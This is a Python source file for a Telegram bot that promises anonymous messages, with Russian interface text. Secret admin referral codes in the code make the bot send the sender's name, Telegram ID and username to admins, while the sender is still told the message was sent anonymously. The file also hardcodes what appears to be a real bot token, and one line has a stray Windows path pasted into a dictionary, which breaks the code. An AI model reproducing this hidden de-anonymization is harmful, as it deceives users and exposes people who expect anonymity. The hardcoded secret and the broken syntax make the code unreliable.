import sqlite3
import time

from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup
from aiogram.types import InlineKeyboardButton

# =====================================
# НАСТРОЙКИ
# =====================================
import os
TOKEN = "8714853815:AAGHOAzbFKDO6yUM7B0SVOaqAB5IAqpywsM"

# ID админов
ADMIN_IDS = [
    8490781536,
    222222222
]

# СЕКРЕТНЫЕ ССЫЛКИ АДМИНОВ
VIP_REFS = {
    "kx92la": 8490781536C:\Users\akano\PycharmProjects\anon_bot,
    "mv81qp": 222222222
}

# =====================================
# BOT
# =====================================

bot = Bot(token=TOKEN)

dp = Dispatcher(bot)

# =====================================
# DATABASE
# =====================================

conn = sqlite3.connect("database.db")

cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    username TEXT,
    first_name TEXT
)
""")

conn.commit()

# =====================================
# ANTISPAM
# =====================================

last_messages = {}

# =====================================
# USER TARGETS
# =====================================

user_targets = {}

# =====================================
# START
# =====================================

@dp.message_handler(commands=["start"])
async def start(message: types.Message):

    user = message.from_user

    cursor.execute("""
    INSERT OR REPLACE INTO users
    (user_id, username, first_name)
    VALUES (?, ?, ?)
    """, (
        user.id,
        user.username,
        user.first_name
    ))

    conn.commit()

    args = message.get_args()

    # =====================================
    # ЕСЛИ ОТКРЫЛИ ССЫЛКУ
    # =====================================

    if args:

        kb = InlineKeyboardMarkup()

        kb.add(
            InlineKeyboardButton(
                "📩 Написать сообщение",
                callback_data=f"write_{args}"
            )
        )

        await message.answer(
            "📩 Отправь анонимное сообщение",
            reply_markup=kb
        )

        return

    # =====================================
    # ГЛАВНОЕ МЕНЮ
    # =====================================

    bot_info = await bot.get_me()

    user_link = (
        f"https://t.me/"
        f"{bot_info.username}"
        f"?start={user.id}"
    )

    text = f"""
👋 Привет

Вот твоя анонимная ссылка:

{user_link}

Отправь её друзьям 👀

Когда тебе напишут —
автор будет скрыт.
"""

    # =====================================
    # VIP ССЫЛКА ДЛЯ АДМИНА
    # =====================================

    for ref_code, admin_id in VIP_REFS.items():

        if user.id == admin_id:

            admin_link = (
                f"https://t.me/"
                f"{bot_info.username}"
                f"?start={ref_code}"
            )

            text += f"""

🔥 Твоя секретная ссылка:

{admin_link}

По ней ты видишь:
- ID автора
- username
- имя
"""

    await message.answer(text)

# =====================================
# WRITE BUTTON
# =====================================

@dp.callback_query_handler(lambda c: c.data.startswith("write_"))
async def write_message(call: types.CallbackQuery):

    target = call.data.split("_", 1)[1]

    user_targets[call.from_user.id] = target

    await call.message.answer(
        "✍️ Напиши сообщение:"
    )

# =====================================
# MESSAGE HANDLER
# =====================================

@dp.message_handler(content_types=types.ContentTypes.TEXT)
async def messages(message: types.Message):

    user = message.from_user

    # ignore commands
    if message.text.startswith("/"):
        return

    # если нет активной отправки
    if user.id not in user_targets:
        return

    # =====================================
    # ANTISPAM
    # =====================================

    now = time.time()

    if user.id in last_messages:

        if now - last_messages[user.id] < 3:

            await message.answer(
                "⏳ Подожди немного"
            )

            return

    last_messages[user.id] = now

    target = user_targets[user.id]

    # =====================================
    # VIP СООБЩЕНИЕ
    # =====================================

    if target in VIP_REFS:

        username = (
            f"@{user.username}"
            if user.username else "нет"
        )

        text = f"""
📩 Новое сообщение

👤 Имя:
{user.first_name}

🆔 ID:
{user.id}

📎 Username:
{username}

💬 Сообщение:
{message.text}
"""

        admin_id = VIP_REFS[target]

        await bot.send_message(
            admin_id,
            text
        )

    # =====================================
    # ОБЫЧНАЯ АНОНИМКА
    # =====================================

    else:

        try:
            target_id = int(target)

        except:
            return

        text = f"""
📩 Новое анонимное сообщение

💬 Текст:
{message.text}
"""

        await bot.send_message(
            target_id,
            text
        )

    await message.answer(
        "✅ Сообщение отправлено анонимно"
    )

    del user_targets[user.id]

# =====================================
# RUN
# =====================================

print("BOT STARTED")

executor.start_polling(dp)